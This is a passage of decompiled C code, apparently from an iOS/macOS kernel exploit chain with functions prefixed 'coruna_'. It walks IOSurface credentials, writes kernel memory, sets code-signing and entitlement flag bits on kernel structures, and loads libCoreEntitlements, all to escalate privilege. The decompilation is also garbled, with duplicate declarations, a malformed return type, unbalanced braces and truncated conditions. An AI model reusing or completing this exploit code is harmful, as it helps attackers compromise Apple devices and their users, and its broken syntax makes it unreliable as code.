  if (scratch == 0) {
    if (handle != 0) {
      _dlclose(handle);
    }
    return;
  }
  coruna_kernel600c_via_helper_5d2c_419fc_2(&scratch);
}





uint64_t coruna_kernel600c_residual_230(long handle,long addr_2,uint64_t val,uint64_t id_2)
{
  long handle;
  long addr;
  uint64_t u;
  unsigned long size;
  long scratch;
  
  size = *(unsigned long *)(handle + 0x158);
  handle = 0x98;
  if (size < 0x1c1b1914600000) {
    handle = 0x90;
  }
  addr = 0xa8;
  if (size < 0x1f530000000000) {
    addr = handle;
  }
  handle = 0xa0;
  if (size < 0x1f530f02800000) {
    handle = addr;
  }
  u = coruna_kernel600c_residual_228(handle,*(long *)(addr_2 + 8) + handle,&scratch);
  if (((int)u != 0) && (u = coruna_kernel600c_via_kernel600c_via_ptr_canonicalize_5(handle,val), (int)u != 0)) {
    *(bool *)id_2 = scratch == *(long *)(handle + 0x390);
    u = 1;
  }
  return u;
}





uint64_t
void coruna_memcpy_22cdc(uint64_t val,uint64_t id_2,uint size,void *ctx,unsigned long arg)
{
  size_t ls1;
  uint u;
  long handle;
  uint *ptr;
  uint64_t size;
  uint version;
  
  handle = coruna_wire_map_slot_lookup();
  size = 0;
  if (handle != 0) {
    ls1 = (arg & 0xffffffff) + 8;
    ptr = _malloc(ls1);
    size = 0;
    if (ptr != (uint *)0x0) {
      u = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
      version = (uint)ls1;
      version = (version & 0xff00ff00) >> 8 | (version & 0xff00ff) << 8;
      *ptr = u >> 0x10 | u << 0x10;
      ptr[1] = version >> 0x10 | version << 0x10;
      _memcpy(ptr + 2,ctx,arg & 0xffffffff);
      size = *(uint64_t *)(handle + 8);
      *(uint **)(handle + 8) = ptr;
      coruna_bzero(size);
      size = 1;
    }
  }
  return size;
}





void coruna_bzero_5(long handle,uint size)
{
  uint u;
  long handle;
  long addr;
  uint64_t size;
  void *ptr;
  uint scratch;
  uint8_t bootargs[48];
  long thread_attr;
  
  thread_attr = *(long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_wire_map_lookup();
  addr = coruna_wire_map_lookup(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  size = 0;
  if (*(long *)k_kernel_stack_chk_guard_slot == thread_attr) {
  return;
  }
  ___stack_chk_fail(size);
}





bool coruna_load_core_entitlements_22e60(uint64_t val,uint64_t id_2,uint64_t size_3)
{
  bool err;
  long handle;
  long *ptr;
  uint64_t *ptr;
  void (*ptr)(void);
  long addr;
  long off;
  long base;
  uint64_t u;
  uint64_t size;
  long ctx_val;
  
  handle = _dlopen("/usr/lib/libCoreEntitlements.dylib",1);
  if (handle == 0) {
    return false;
  }
  ptr = (long *)_dlsym(handle,"kCENoError");
  if (ptr != (long *)0x0) {
    ctx_val = *ptr;
    ptr = (uint64_t *)_dlsym(handle,"CECRuntime");
    if (ptr != (uint64_t *)0x0) {
      u = *ptr;
      ptr = (void (*)_dlsym(handle,"CESerializeCFDictionary");
      if ((ptr != (void (*)0x0) && (addr = _dlsym(handle,"CEGetErrorString"), addr != 0)) {
        size = *(uint64_t *)k_kernel_kcfallocatordefault_slot;
        addr = _CFDataCreateWithBytesNoCopy
                          (size,val,id_2,*(uint64_t *)k_kernel_kcfallocatornull_slot);
        if (addr != 0) {
          off = _CFPropertyListCreateWithData(size,addr,0,0,0);
          if (off != 0) {
            base = (*ptr)(u,off,size_3);
            err = ctx_val == base;
            _CFRelease(addr);
            _CFRelease(off);
            _dlclose(handle);
            return err;
          }
          _CFRelease(addr);
        }
      }
    }
  }
  err = false;
fail:
  _dlclose(handle);
  return err;
}





uint64_t coruna_return_zero_22fa8(byte *arg,uint64_t val,uint size,void *ctx,uint flags_2)
{
  size_t ls1;
  uint u;
  int err;
  uint *ptr;
  uint size;
  
  if (((*arg & 1) != 0) && (*(int *)(arg + 0x30) == 1)) {
    ls1 = (unsigned long)flags_2 + 8;
    ptr = _malloc(ls1);
    if (ptr == (uint *)0x0) {
      return 0;
    }
    u = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
    size = (uint)ls1;
    size = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
    *ptr = u >> 0x10 | u << 0x10;
    ptr[1] = size >> 0x10 | size << 0x10;
    _memcpy(ptr + 2,ctx,(unsigned long)flags_2);
    err = coruna_iokit_msg_append(*(uint64_t *)(arg + 0x38),val,ptr);
    if (err != -1) {
      return 1;
    }
    coruna_bzero(ptr);
  }
  return 0;
}





uint64_t coruna_bzero_6(long handle,uint size)
{
  int err;
  int status;
  uint u;
  uint size;
  uint version;
  uint port;
  uint tag;
  void *ptr;
  void *buf;
  uint64_t kind;
  unsigned long type_id;
  
  ptr = (void *)coruna_wire_map_lookup(handle,*(uint32_t *)(handle + 0x40),0xfade0c02);
  kind = 0;
  if (ptr != (void *)0x0) {
    u = (*(uint *)((long)ptr + 0x18) & 0xff00ff00) >> 8 |
            (*(uint *)((long)ptr + 0x18) & 0xff00ff) << 8;
    u = u >> 0x10 | u << 0x10;
    if (u < size) {
      err = *(int *)(handle + 0x48);
      status = err * (size - u);
      size = (*(uint *)((long)ptr + 4) & 0xff00ff00) >> 8 |
              (*(uint *)((long)ptr + 4) & 0xff00ff) << 8;
      type_id = (unsigned long)((size >> 0x10 | size << 0x10) + status);
      buf = _malloc(type_id);
      kind = 0;
      if (buf != (void *)0x0) {
        _bzero(buf,type_id);
        size = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
        u = err * u;
        _memcpy(buf,ptr,(unsigned long)((size >> 0x10 | size << 0x10) - u));
        version = (*(uint *)((long)ptr + 4) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 4) & 0xff00ff) << 8;
        port = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
        size = (*(uint *)((long)buf + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)buf + 0x10) & 0xff00ff) << 8;
        size = (size >> 0x10 | size << 0x10) + status;
        tag = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
        *(uint *)((long)buf + 0x10) = tag >> 0x10 | tag << 0x10;
        tag = (*(uint *)((long)buf + 4) & 0xff00ff00) >> 8 |
                (*(uint *)((long)buf + 4) & 0xff00ff) << 8;
        tag = (tag >> 0x10 | tag << 0x10) + status;
        tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
        *(uint *)((long)buf + 4) = tag >> 0x10 | tag << 0x10;
        tag = (size & 0xff00ff00) >> 8 | (size & 0xff00ff) << 8;
        *(uint *)((long)buf + 0x18) = tag >> 0x10 | tag << 0x10;
        tag = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
        _memcpy((void *)((long)buf + ((unsigned long)size - (unsigned long)u)),
                (void *)((long)ptr + ((unsigned long)(tag >> 0x10 | tag << 0x10) - (unsigned long)u)),
                (unsigned long)(((version >> 0x10 | version << 0x10) + u) - (port >> 0x10 | port << 0x10))
               );
        u = (*(uint *)((long)ptr + 0x14) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x14) & 0xff00ff) << 8;
        size = (*(uint *)((long)ptr + 0x10) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 0x10) & 0xff00ff) << 8;
        size = size >> 0x10 | size << 0x10;
        if (size < (u >> 0x10 | u << 0x10)) {
          u = (*(uint *)((long)buf + 0x14) & 0xff00ff00) >> 8 |
                  (*(uint *)((long)buf + 0x14) & 0xff00ff) << 8;
          u = (u >> 0x10 | u << 0x10) + status;
          u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
          *(uint *)((long)buf + 0x14) = u >> 0x10 | u << 0x10;
        }
        u = (*(uint *)((long)ptr + 8) & 0xff00ff00) >> 8 |
                (*(uint *)((long)ptr + 8) & 0xff00ff) << 8;
        u = u >> 0x10 | u << 0x10;
        if (0x200 < u >> 8) {
          tag = (*(uint *)((long)ptr + 0x2c) & 0xff00ff00) >> 8 |
                  (*(uint *)((long)ptr + 0x2c) & 0xff00ff) << 8;
          if (size < (tag >> 0x10 | tag << 0x10)) {
            tag = (*(uint *)((long)buf + 0x2c) & 0xff00ff00) >> 8 |
                    (*(uint *)((long)buf + 0x2c) & 0xff00ff) << 8;
            tag = (tag >> 0x10 | tag << 0x10) + status;
            tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
            *(uint *)((long)buf + 0x2c) = tag >> 0x10 | tag << 0x10;
          }
          if (0x201ff < u) {
            tag = (*(uint *)((long)ptr + 0x30) & 0xff00ff00) >> 8 |
                    (*(uint *)((long)ptr + 0x30) & 0xff00ff) << 8;
            if (size < (tag >> 0x10 | tag << 0x10)) {
              tag = (*(uint *)((long)buf + 0x30) & 0xff00ff00) >> 8 |
                      (*(uint *)((long)buf + 0x30) & 0xff00ff) << 8;
              tag = (tag >> 0x10 | tag << 0x10) + status;
              tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
              *(uint *)((long)buf + 0x30) = tag >> 0x10 | tag << 0x10;
            }
            if (0x204ff < u) {
              tag = (*(uint *)((long)ptr + 0x5c) & 0xff00ff00) >> 8 |
                      (*(uint *)((long)ptr + 0x5c) & 0xff00ff) << 8;
              if (size < (tag >> 0x10 | tag << 0x10)) {
                tag = (*(uint *)((long)buf + 0x5c) & 0xff00ff00) >> 8 |
                        (*(uint *)((long)buf + 0x5c) & 0xff00ff) << 8;
                tag = (tag >> 0x10 | tag << 0x10) + status;
                tag = (tag & 0xff00ff00) >> 8 | (tag & 0xff00ff) << 8;
                *(uint *)((long)buf + 0x5c) = tag >> 0x10 | tag << 0x10;
              }
              if ((0x205ff < u) &&
                 (u = (*(uint *)((long)ptr + 100) & 0xff00ff00) >> 8 |
                          (*(uint *)((long)ptr + 100) & 0xff00ff) << 8,
                 size < (u >> 0x10 | u << 0x10))) {
                u = (*(uint *)((long)buf + 100) & 0xff00ff00) >> 8 |
                        (*(uint *)((long)buf + 100) & 0xff00ff) << 8;
                u = (u >> 0x10 | u << 0x10) + status;
                u = (u & 0xff00ff00) >> 8 | (u & 0xff00ff) << 8;
                *(uint *)((long)buf + 100) = u >> 0x10 | u << 0x10;
              }
            }
          }
        }
        kind = coruna_kernel600c_via_memcpy_25294(handle,*(uint32_t *)(handle + 0x40),buf);
        _free(buf);
      }
    }
    else {
      kind = 1;
    }
  }
  return kind;
}





uint64_t coruna_return_zero_23288(long handle,uint64_t val)
{
  bool err;
  int err;
  long handle;
  uint64_t u;
  long addr;
  long off;
  unsigned long size;
  long base;
  long ctx_val;
  char scratch;
  
  scratch = '\0';
  u = 1;
  err = coruna_ctx_test_flag(handle,0x5184201);
  if (err != 0) {
    do {
    handle = coruna_kernel600c_via_return_zero_293c0_2(handle,val);
    if (handle == 0) {
      return 0;
    }
    err = coruna_ctx_test_flag(handle,0x20);
    if (err == 0) {
      err = coruna_ctx_test_flag(handle,0x5184001);
      if (err == 0) {
        u = coruna_ctx_test_flag(handle,0x200);
        if ((int)u == 0) {
          return u;
        }
        err = *(int *)(handle + 0x140);
        if (err < 0x1809) break;
        if (err < 0x2258) {
          if (err < 0x1f53) {
            if (err < 0x1c1b) {
              off = 0xe7;
              if (*(unsigned long *)(handle + 0x158) < 0x18090a07900000) {
                off = 0xef;
              }
            }
            else {
              off = 0xdf;
            }
          }
          else {
            off = 0x97;
          }
        }
        else {
          off = 0x8f;
        }
        off = handle + 0x92;
        u = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,off,1,&scratch);
        if ((int)u == 0) {
          return u;
        }
        if (scratch != '\0') {
          break;
        }
        u = 0;
        break;
      }
      err = *(int *)(handle + 0x140);
      if (err < 0x2712) {
        if (0x2257 < err) {
          err = coruna_ctx_test_flag(handle,0x1180000);
          err = err == 0;
          ctx_val = 0xb9;
          if (!err) {
            ctx_val = 0xc1;
          }
          base = 0xba;
          if (!err) {
            base = 0xc2;
          }
          addr = 0xbf;
          off = 0xb7;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        if (0x1f52 < err) {
          u = 0x180000;
          err = coruna_ctx_test_flag(handle,u);
          err = err == 0;
          ctx_val = 0xc1;
          if (!err) {
          ctx_val = 0xc9;
          }
          base = 0xc2;
          if (!err) {
          base = 0xca;
          }
          addr = 199;
          off = 0xbf;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        size = *(unsigned long *)(handle + 0x158);
        if (0x1c1b0a800fffff < size) {
          err = coruna_ctx_test_flag(handle,0x80000);
          err = err == 0;
          ctx_val = 0x101;
          if (!err) {
            ctx_val = 0x109;
          }
          off = 0x10a;
          base = 0x102;
          if (!err) {
            base = off;
          }
          addr = 0x107;
          off = 0xff;
          if (!err) {
          off = addr;
          }
          }
          off = off + handle;
          err = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,off,1,&scratch);
          if (err == 0) {
          return 0;
        }
        if (0x1c1a < err) {
          err = coruna_ctx_test_flag(handle,0x80000);
          err = err == 0;
          ctx_val = 0x100;
          if (!err) {
            ctx_val = 0x108;
          }
          off = 0x109;
          base = 0x101;
          if (!err) {
            base = off;
          }
          addr = 0x107;
          off = 0xff;
          if (!err) {
            off = addr;
          }
        }
        else {
        ctx_val = 0x108;
        if (size < 0x18090a07900000) {
          ctx_val = 0x110;
        }
        base = 0x109;
        if (size < 0x18090a07900000) {
          base = 0x111;
        }
        off = 0x107;
        if (size < 0x18090a07900000) {
          off = 0x10f;
        }
      }
      else {
        u = 0x1180000;
check_ok:
        err = coruna_ctx_test_flag(handle,u);
        err = err == 0;
        ctx_val = 0xc1;
        if (!err) {
          ctx_val = 0xc9;
        }
        base = 0xc2;
        if (!err) {
          base = 0xca;
        }
        addr = 199;
        off = 0xbf;
cleanup:
        if (!err) {
          off = addr;
        }
      }
      off = off + handle;
      err = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,off,1,&scratch);
      if (err == 0) {
        return 0;
      }
      if (scratch == '\0') {
        return 0;
      }
      u = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,ctx_val + handle,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch == '\0') break;
      u = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,base + handle,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch != '\0') {
        off = handle + 0x92;
        u = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,off,1,&scratch);
        if ((int)u == 0) {
          return u;
        }
        if (scratch != '\0') {
          break;
        }
      }
    }
    }
    else {
      off = handle + 0x92;
      u = coruna_call_mach_vm_machine_attribute_29df8_127a4(handle,off,1,&scratch);
      if ((int)u == 0) {
        return u;
      }
      if (scratch != '\0') {
        break;
      }
    }
    u = 0;
    } while (0);
  }
  return u;
}





unsigned long coruna_return_zero_23590(long arg,uint64_t val)

{
  bool i;
  int n;
  long serial_11;
  unsigned long size;
  uint64_t version;
  long serial_16;
  long serial_18;
  long serial_17;
  char cache_96;
  long cache_97;
  char cache_98;
  
  cache_98 = '\0';
  n = coruna_ctx_test_flag(arg,0x5184001);
  if (n == 0) {
load_ok_76:
    size = 1;
  }
  else {
    serial_11 = coruna_kernel600c_via_return_zero_293c0_2(arg,val);
    if (serial_11 == 0) {
      return 0;
    }
    n = coruna_ctx_test_flag(arg,0x20);
    if (n == 0) {
      n = *(int *)(arg + 0x140);
      if (n < 0x2712) {
        if (0x2257 < n) {
          n = coruna_ctx_test_flag(arg,0x1180000);
          i = n == 0;
          serial_16 = 0xb9;
          if (!i) {
            serial_16 = 0xc1;
          }
          serial_18 = 0xc2;
          serial_17 = 0xba;
          if (!i) {
          serial_17 = serial_18;
          }
          }
          size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,serial_16 + serial_11,1,&cache_98);
          if ((int)size == 0) {
          return size;
        }
        if (0x1f52 < n) {
          version = 0x180000;
          n = coruna_ctx_test_flag(arg,version);
          i = n == 0;
          serial_16 = 0xc1;
          if (!i) {
          serial_16 = 0xc9;
          }
          serial_18 = 0xca;
          serial_17 = 0xc2;
          if (!i) {
          serial_17 = serial_18;
          }
          }
          size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,serial_16 + serial_11,1,&cache_98);
          if ((int)size == 0) {
          return size;
        }
        size = *(unsigned long *)(arg + 0x158);
        if (0x1c1b0a800fffff < size) {
          n = coruna_ctx_test_flag(arg,0x80000);
          i = n == 0;
          serial_16 = 0x101;
          if (!i) {
            serial_16 = 0x109;
          }
          serial_18 = 0x10a;
          serial_17 = 0x102;
          if (!i) {
          serial_17 = serial_18;
          }
          }
          size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,serial_16 + serial_11,1,&cache_98);
          if ((int)size == 0) {
          return size;
        }
        if (0x1c1a < n) {
          n = coruna_ctx_test_flag(arg,0x80000);
          i = n == 0;
          serial_16 = 0x100;
          if (!i) {
            serial_16 = 0x108;
          }
          serial_18 = 0x109;
          serial_17 = 0x101;
          if (!i) {
          serial_17 = serial_18;
          }
          }
          size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,serial_16 + serial_11,1,&cache_98);
          if ((int)size == 0) {
          return size;
        }
        serial_16 = 0x108;
        if (size < 0x18090a07900000) {
          serial_16 = 0x110;
        }
        serial_17 = 0x109;
        if (size < 0x18090a07900000) {
          serial_17 = 0x111;
        }
      }
      else {
        version = 0x1180000;
load_ok_78:
        n = coruna_ctx_test_flag(arg,version);
        i = n == 0;
        serial_16 = 0xc1;
        if (!i) {
          serial_16 = 0xc9;
        }
        serial_18 = 0xca;
        serial_17 = 0xc2;
load_ok_77:
        if (!i) {
          serial_17 = serial_18;
        }
      }
      size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,serial_16 + serial_11,1,&cache_98);
      if ((int)size == 0) {
        return size;
      }
      if (cache_98 == '\0') goto load_ok_76;
      size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,serial_17 + serial_11,1,&cache_98);
      n = (int)size;
    }
    else {
      size = coruna_kernel600c_residual_228(arg,serial_11 + 0xb0,&cache_97);
      if ((int)size == 0) {
        return size;
      }
      serial_11 = coruna_ptr_canonicalize(arg,cache_97);
      if (serial_11 == 0) {
        return 0;
      }
      size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(arg,cache_97 + 0x20,1,&cache_96);
      n = (int)size;
      cache_98 = cache_96;
    }
    if (n != 0) {
      size = (unsigned long)(cache_98 != '\0');
    }
  }
  return size;
}





unsigned long coruna_kernel600c_via_kernel600c_via_mach_vm_machine_attribute(uint64_t arg)

{
  int fd_11;
  long base;
  unsigned long u;
  uint cache_99;
  
  base = coruna_return_zero_29d20();
  u = 0;
  if ((base != 0) && (u = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,base,&cache_99), (int)u != 0)) {
    if ((cache_99 & 1) == 0) {
      fd_11 = coruna_kernel600c_via_mach_vm_machine_attribute(arg,base,cache_99 | 1);
      u = (unsigned long)(fd_11 != 0);
    }
    else {
      u = 1;
    }
  }
  return u;
}





unsigned long coruna_kernel600c_via_kernel600c_via_kernel600c_via_fd_read_full(long arg,uint64_t val,int n)

{
  uint type_id_21;
  bool err;
  unsigned long u;
  long serial_12;
  uint version;
  uint cache_81;
  
  u = coruna_return_zero_23590();
  if ((((int)u != 0) && (serial_12 = coruna_return_zero_29d20(arg,val), u = 0, serial_12 != 0)) &&
     (u = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,serial_12,&cache_81), (int)u != 0)) {
    version = 0x10000001;
    if (n == 0) {
      version = 0x301;
    }
    version = version | cache_81 & 0xeffffcfe;
    err = version == cache_81;
    cache_81 = version;
    if (((err) || (u = coruna_kernel600c_via_mach_vm_machine_attribute(arg,serial_12), (int)u != 0)) &&
       ((serial_12 = coruna_return_zero_293c0(arg,val), u = 0, serial_12 != 0 &&
        (u = coruna_iosurface_cred_walk(arg), (int)u != 0)))) {
      serial_12 = serial_12 + (u & 0xffffffff);
      u = coruna_kernel600c_via_kernel600c_via_fd_read_full(arg,serial_12,&cache_81);
      if ((int)u != 0) {
        version = 0x8010;
        if (*(unsigned long *)(arg + 0x158) < 0x1c1b1e02600000) {
          version = 0x10;
        }
        type_id_21 = cache_81 & (version ^ 0xffffffff);
        if (n == 0) {
          type_id_21 = version | cache_81;
        }
        if ((type_id_21 == cache_81) ||
           (cache_81 = type_id_21, u = coruna_mach_vm_machine_attribute(arg,serial_12), (int)u != 0)) {
          u = 1;
        }
      }
    }
  }
  return u;
}





void coruna_kernel600c_via_call_mach_vm_machine_attribute_29df8_1c57c_3(uint *size,uint64_t val)
{
  unsigned long *ptr;
  int err;
  long handle;
  uint64_t u;
  uint64_t scratch;
  long bootargs;
  uint64_t scratch;
  uint64_t bootargs;
  uint64_t thread_attr;
  uint64_t thread_attr;
  uint64_t host_info;
  uint64_t serial_buf;
  uint64_t host_info;
  uint64_t action;
  uint64_t block_ctx;
  uint64_t stack_guard;
  uint64_t serial_buf;
  long action;
  uint block_ctx;
  uint8_t stack_guard[8];
  long sa_saved;
  long sa_new;
  unsigned long path_buf;
  uint64_t tmp_buf;
  uint64_t sa_saved;
  uint64_t sa_new;
  unsigned long region [23];
  
  region[0x16] = *(unsigned long *)k_kernel_stack_chk_guard_slot;
  handle = coruna_call_macho_data_seg_2bb24_2bdb4_2a678(size,val,&block_ctx);
  u = 0;
  if ((handle == 0) ||
     (((block_ctx >> 10 & 1) == 0 &&
      if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
      return;
      }
      ___stack_chk_fail(u);
  if ((0x22580a06bfffff < *(unsigned long *)(size + 0x56)) ||
     ((0x1f543c407fffff < *(unsigned long *)(size + 0x56) && ((int)size[0x50] < 0x2258)))) {
    handle = coruna_return_zero_2a5e0(size,val,1,&block_ctx);
    u = 0;
    if ((handle == 0) ||
       (((block_ctx >> 10 & 1) == 0 &&
        (u = coruna_kernel600c_via_mach_vm_machine_attribute(size,handle,block_ctx | 0x400), (int)u == 0))))
    if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
    return;
    }
    ___stack_chk_fail(u);
  }
  u = coruna_plist_dict_21c8c(size,val,stack_guard);
  if (((int)u == 0) || (u = coruna_kernel600c_via_kernel600c_via_vm_deallocate(size,stack_guard), (int)u == 0))
  if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
  return;
  }
  ___stack_chk_fail(u);
  if ((*(unsigned long *)(size + 0x56) < 0x1c1b1914600000) ||
     (((*size & 0x5584001) == 0 && (*(unsigned long *)(size + 0x56) < 0x1f530000000000)))) {
done:
    coruna_kernel600c_via_kernel5_via_bzero_5(stack_guard);
    u = coruna_return_zero_23e1c(size,val,&scratch);
    if (((int)u == 0) ||
       (u = coruna_return_zero_23ef8(size,val,&scratch,0,stack_guard), (int)u == 0))
    if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
    return;
    }
    ___stack_chk_fail(u);
    handle = 0x58;
    if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
      handle = 0x48;
    }
    err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(size,handle + sa_saved,0x14,&tmp_buf);
    if ((err != 0) && (err = coruna_kernel600c_via_kernel600c_via_free_17fd4(size,&tmp_buf,0x14), err != 0)) {
      u = coruna_kernel600c_via_kernel600c_via_vm_deallocate(size,stack_guard);
      if ((int)u != 0) {
        coruna_kernel600c_via_kernel5_via_bzero_5(stack_guard);
        u = 1;
      }
      if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
      return;
      }
      ___stack_chk_fail(u);
    }
  }
  else if (sa_new != 0) {
    u = coruna_kernel600c_residual_228(size,sa_new,&action);
    if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
    return;
    }
    ___stack_chk_fail(u);
    if (action != 0) {
      do {
        region[0x15] = 0;
        region[0x12] = 0;
        region[0x11] = 0;
        region[0x14] = 0;
        region[0x13] = 0;
        region[0xe] = 0;
        region[0xd] = 0;
        region[0x10] = 0;
        region[0xf] = 0;
        region[10] = 0;
        region[9] = 0;
        region[0xc] = 0;
        region[0xb] = 0;
        region[6] = 0;
        region[5] = 0;
        region[8] = 0;
        region[7] = 0;
        region[2] = 0;
        region[1] = 0;
        region[4] = 0;
        region[3] = 0;
        u = 0x40;
        if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
          u = 0x30;
        }
        sa_saved = 0;
        tmp_buf = 0;
        region[0] = 0;
        sa_new = 0;
        err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(size,action,u,&tmp_buf);
        u = 0;
        if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
        return;
        }
        ___stack_chk_fail(u);
        ptr = region + 2;
        if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
          ptr = region;
        }
        if (path_buf != *ptr && *ptr >> 0x1d != 0) {
          serial_buf = 0;
          action = 0;
          host_info = 0;
          stack_guard = 0;
          block_ctx = 0;
          thread_attr = 0;
          thread_attr = 0;
          serial_buf = 0;
          host_info = 0;
          scratch = 0;
          bootargs = 0;
          scratch = 0;
          bootargs = action;
          err = coruna_kernel600c_via_kernel600c_via_vm_deallocate(size,&scratch);
          u = 0;
          if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
          return;
          }
          ___stack_chk_fail(u);
        }
        u = coruna_kernel600c_residual_228(size,action,&action);
        if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
        return;
        }
        ___stack_chk_fail(u);
      } while (action != 0);
      {
        coruna_kernel600c_via_kernel5_via_bzero_5(stack_guard);
        u = coruna_return_zero_23e1c(size,val,&scratch);
        if (((int)u == 0) ||
        (u = coruna_return_zero_23ef8(size,val,&scratch,0,stack_guard), (int)u == 0))
        if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
        return;
        }
        ___stack_chk_fail(u);
        handle = 0x58;
        if (*(unsigned long *)(size + 0x56) < 0x1f530f02800000) {
        handle = 0x48;
        }
        err = coruna_call_mach_vm_machine_attribute_29df8_1c57c(size,handle + sa_saved,0x14,&tmp_buf);
        if ((err != 0) && (err = coruna_kernel600c_via_kernel600c_via_free_17fd4(size,&tmp_buf,0x14), err != 0)) {
        u = coruna_kernel600c_via_kernel600c_via_vm_deallocate(size,stack_guard);
        if ((int)u != 0) {
        coruna_kernel600c_via_kernel5_via_bzero_5(stack_guard);
        u = 1;
        }
        if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
        return;
        }
        ___stack_chk_fail(u);
        }
      }
    }
  }
cleanup:
  u = 0;
fail:
  if (*(long *)k_kernel_stack_chk_guard_slot == region[0x16]) {
    return;
  }
  ___stack_chk_fail(u);
}





uint64_t coruna_kernel600c_via_kernel600c_via_vm_deallocate(long handle,uint *size)
{
  uint u;
  bool err;
  uint64_t size;
  unsigned long version;
  long handle;
  long scratch;
  uint bootargs;
  uint thread_attr;
  
  thread_attr = 1;
  version = *(unsigned long *)(handle + 0x158);
  if (version < 0x1f530f02800000) {
    if (version < 0x1f530000000000) {
      if (version < 0x1c1b1914600000) {
        handle = 0xa0;
        if (*(int *)(handle + 0x140) < 0x1c1b) {
          handle = 0xa8;
        }
      }
      else {
        handle = 0xa8;
      }
    }
    else {
      handle = 0xb8;
    }
  }
  else {
    handle = 0xac;
  }
  size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,*(long *)(size + 2) + handle,1,&thread_attr);
  if ((int)size != 0) {
    if ((thread_attr & 1) == 0) {
      thread_attr = thread_attr | 1;
      size = coruna_kernel600c_via_vm_deallocate(handle,*(long *)(size + 2) + handle,&thread_attr,1);
      if ((int)size == 0) {
        return size;
      }
    }
    handle = 0x20;
    if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
      handle = 0x10;
    }
    size = coruna_call_mach_vm_machine_attribute_29df8_1c57c(handle,handle + *(long *)(size + 2),4,&bootargs);
    if ((int)size != 0) {
      if (((bootargs ^ 0xffffffff) & 0x4004000) != 0) {
        u = 0x4000000;
        if (*(int *)(handle + 0x140) < 0x1c1b) {
          u = 0x4004000;
        }
        u = u | bootargs;
        err = u != bootargs;
        bootargs = u;
        if (err) {
          size = coruna_kernel600c_via_vm_deallocate(handle,*(long *)(size + 2) + handle,&bootargs,4);
          if ((int)size == 0) {
            return size;
          }
          *size = bootargs;
        }
      }
      handle = 0x88;
      if (*(unsigned long *)(handle + 0x158) < 0x1f530f02800000) {
        handle = 0x80;
      }
      size = coruna_kernel600c_residual_228(handle,handle + *(long *)(size + 2),&scratch);
      if (((int)size != 0) &&
         ((scratch == 0 ||
          (size = coruna_kernel600c_via_mach_vm_machine_attribute_1e63c(handle,*(long *)(size + 2) + handle,0), (int)size != 0)))) {
        size[0x14] = 0;
        size = 1;
      }
    }
  }
  return size;
}





uint64_t coruna_return_zero_23e1c(uint64_t val,uint64_t id_2,unsigned long *arg)
{
  int err;
  long handle;
  long addr;
  uint64_t u;
  unsigned long scratch;
  uint bootargs;
  uint8_t thread_attr[4];
  unsigned long host_info;
  
  host_info = 0;
  handle = coruna_ret_stub_2();
  u = 0;
  if (handle != 0) {
    addr = coruna_return_zero_2b0c0(val,handle);
    u = 0;
    if ((addr != 0) && (u = coruna_kernel600c_residual_228(val,addr,&host_info), (int)u != 0)) {
